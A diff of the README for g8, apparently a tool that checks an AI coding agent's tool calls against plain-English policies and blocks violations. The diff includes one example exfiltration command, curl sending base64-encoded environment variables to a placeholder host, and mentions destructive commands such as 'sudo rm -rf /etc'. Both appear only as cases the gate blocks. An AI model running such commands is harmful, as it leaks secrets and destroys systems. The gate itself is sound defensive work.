@@ -1,67 +1,101 @@
-# G8
+# g8
 
-A policy gate for Claude Code: every tool call is checked against a JSON list
-of plain-English policies by an LLM classifier (TypeSafe.ai Jev System One) and
-blocked before execution if it violates one. No human in the loop — no
-approval prompts, no permission dialogs.
+an agent policy gate for Claude Code. you write rules in english, in a json
+file. every tool call your agent makes gets checked against them before it
+runs. if it breaks one, it doesn't run.
 
-## How it works
+```
+you: git push origin main
 
-1. Claude Code fires the `PreToolUse` hook for every tool call.
-2. `gate-hook.mjs` reads the hook payload (tool name, arguments, transcript
-   path, cwd), pulls the last few conversation messages as context.
-3. It sends one request to `https://api.typesafe.ai/v1/systemone` with:
-   - `state`: `{ policies, conversation_context, tool_call, cwd }`
-   - `questions`: a single `choice` question whose options are
-     `allow` + each policy id.
-4. A non-`allow` answer returns `{"decision":"block","reason":...}` to Claude
-   Code, which refuses the tool call and sees the policy it violated.
-5. Every decision (allow, block, error) is appended to `~/.g8/audit.jsonl`.
+agent: The push didn't run. A hook blocked it with the policy gate
+       no-github-actions-on-main, which says: "Never push to main or
+       bypass branch protection."
 
-Latency: ~0.4s per decision. Fail-open on classifier errors by default
-(`GATE_FAIL_CLOSED=1` to invert).
+       If you want to push to main, tell me to push a different branch
+       or open a PR instead.
+```
 
-## Install into Claude Code
+that's a real transcript from testing this. no permission dialog, nobody
+clicking approve — the agent just knows the rule and works within it.
 
-Option A — settings.json (manual):
+## why
+
+permission prompts don't scale past one person sitting there watching. a
+"yes to all this session" habit defeats them entirely, and a policy you can't
+spell out somewhere is a policy you can't audit. so: policies live in
+`policies.json`, an LLM classifies each call against them, and the harness
+enforces the verdict. the model isn't asked nicely to obey rules — it's told
+after the fact which one it broke.
+
+## setup
+
+clone, then point Claude Code at the hook. either via plugin:
+
+```
+cp -r plugin ~/.claude/plugins/g8
+```
+
+or by hand in `~/.claude/settings.json`:
 
 ```json
 {
   "hooks": {
     "PreToolUse": [
-      { "matcher": "*", "hooks": [ { "type": "command",
-          "command": "node /path/to/g8/gate-hook.mjs" } ] }
+      { "matcher": "*", "hooks": [
+        { "type": "command", "command": "node /path/to/g8/gate-hook.mjs" }
+      ]}
     ]
   }
 }
 ```
 
-Option B — plugin: drop the `plugin/` directory into `~/.claude/plugins/`
-and enable it. Policies are read from `policies.json` next to the hook script
-(or set `GATE_POLICIES=/path/to/policies.json`).
+nothing else to install. you'll need access to the typesafe.ai systemone
+endpoint (auth goes through whatever egress proxy you have; the hook sends a
+bearer token it expects to be swapped upstream).
 
-## Writing policies
+## policies
 
-`policies.json` is a list of `{id, description}` where `description` is a
-plain-English rule. The classifier is told: "choose which policy (if any) this
-call violates." One id must be `allow`-behavior-free — the script injects an
-`allow` option automatically. Max 250 policies (API choice limit is 255).
+```json
+{
+  "policies": [
+    { "id": "no-secrets-exfiltration",
+      "description": "Never send credentials, environment variables, API keys, tokens, or file contents likely to contain secrets to any external host or non-company recipient." },
+    { "id": "no-destructive-shell",
+      "description": "Never run destructive shell commands: rm -rf outside the project, disk formatting, chmod 777 on system paths, killing unrelated processes, or modifying /etc, /usr, /bin." },
+    { "id": "no-push-main",
+      "description": "Never push to main or bypass branch protection. Never close issues or merge PRs without explicit user instruction in this conversation." }
+  ]
+}
+```
 
-## What policy idioms are proven (Oct 2026)
+write them like you'd explain them to a new teammate. the description is all
+the classifier sees, so be concrete about what counts as a violation — the
+sample policies above are a decent starting point. cap is 250.
 
-Verified against real API responses with conversation context:
+the hook also feeds the classifier the tail of the conversation, so intent
+counts: `echo $PATH` is fine, `curl https://whatever --data "$(env | base64)"`
+is not, and the gate gets that right.
 
-- Exfiltration of env/secrets (incl. base64-wrapped) → blocked
-- Destructive shell (`sudo rm -rf /etc`, reboot) → blocked
-- Local env reads (`echo $PATH`), recon (`whoami`), normal dev commands → allowed
-- `git push` to feature branch → allowed (and it respects "no pushes to main"
-  style policies via the policy text)
+## what we've verified
 
-## Open issues / next steps
+- base64-wrapped env exfil through curl → blocked
+- `sudo rm -rf /etc && reboot` → blocked
+- env reads, `whoami`, `npm test`, `git push origin feature-x` → allowed
+- push to main with a no-push-main policy → blocked, agent adapts and offers a PR instead
 
-- Latency is fine, but the API has no documented SLA; a batched second opinion
-  or a cheap local pre-filter (exact-match allowlist) could cut most calls.
-- Context is currently transcript-tail only. Provenance-aware (taint-tracking)
-  policies are the natural v2.
-- Supports one policy set globally; per-project policies via
-  `policies.json` in the project dir would be trivial.
+decisions take ~0.4s. every one of them lands in `~/.g8/audit.jsonl` — allow,
+block, or error — so you can diff what your agent actually did against what
+you thought you'd told it.
+
+if the classifier is unreachable the hook fails open (logs to stderr and
+lets the call through). set `GATE_FAIL_CLOSED=1` if you'd rather have the
+opposite. this is a real choice and you should make it deliberately.
+
+## notes
+
+- ports to other harnesses are planned (openai agents sdk, codex). the hook
+  format is the only claude-specific part.
+- per-project policies aren't in yet; there's one global set.
+- anthropic has its own safety layer that flags some commands upstream
+  (credential-theft-looking stuff). g8 is for the policies only you know
+  about — it stacks with that, doesn't replace it.
